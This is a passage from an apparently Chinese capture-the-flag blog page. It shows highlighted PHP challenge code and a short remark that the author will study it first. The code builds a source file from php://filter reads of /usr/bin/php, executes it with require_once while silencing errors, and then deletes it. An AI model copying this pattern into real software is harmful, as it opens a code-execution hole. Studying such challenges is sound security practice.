+</span></span><span class="line"><span class="cl">    <span class="nx">array_push</span><span class="p">(</span><span class="nv">$file_contents</span><span class="p">,</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;php://filter/&#34;</span><span class="o">.</span><span class="nv">$filter</span><span class="o">.</span><span class="s2">&#34;/resource=/usr/bin/php&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">shuffle</span><span class="p">(</span><span class="nv">$file_contents</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$source_file</span><span class="p">,</span> <span class="nv">$file_contents</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">require_once</span> <span class="nv">$source_file</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">catch</span><span class="p">(</span><span class="nx">\Throwable</span> <span class="nv">$e</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">pass</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">unlink</span><span class="p">(</span><span class="nv">$source_file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>先研究研究。。。</p>
 
